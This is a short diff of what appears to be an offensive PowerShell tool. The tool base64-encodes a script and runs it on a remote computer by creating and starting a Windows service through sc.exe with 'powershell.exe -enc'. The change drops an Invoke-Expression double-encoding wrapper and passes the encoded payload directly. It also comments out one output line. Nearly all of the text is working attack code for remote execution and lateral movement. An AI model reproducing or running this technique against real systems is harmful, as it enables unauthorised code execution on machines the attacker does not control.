@@ -111,11 +111,7 @@ while (`$true) {
 	
 	$B64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))
 	
-	$FullCommand = "`$encstring = `"$B64ServerScript`"; `$decodedstring = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(`$encstring)); Invoke-Expression `$decodedstring"
-	
-	$b64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($FullCommand))
-	
-	$arguments = "\\$ComputerName create $ServiceName binpath= `"C:\Windows\System32\cmd.exe /c powershell.exe -enc $b64command`""
+	$arguments = "\\$ComputerName create $ServiceName binpath= `"C:\Windows\System32\cmd.exe /c powershell.exe -enc $B64ServerScript`""
 	
 	$startarguments = "\\$ComputerName start $ServiceName"
 	
@@ -133,7 +129,7 @@ while (`$true) {
 		Write-Output ""
 		Write-Output " [+] Creating Service on Remote Target..."
 	}
-	Write-Output ""
+	#Write-Output ""
 	
 	# Get the current process ID
 	$currentPID = $PID
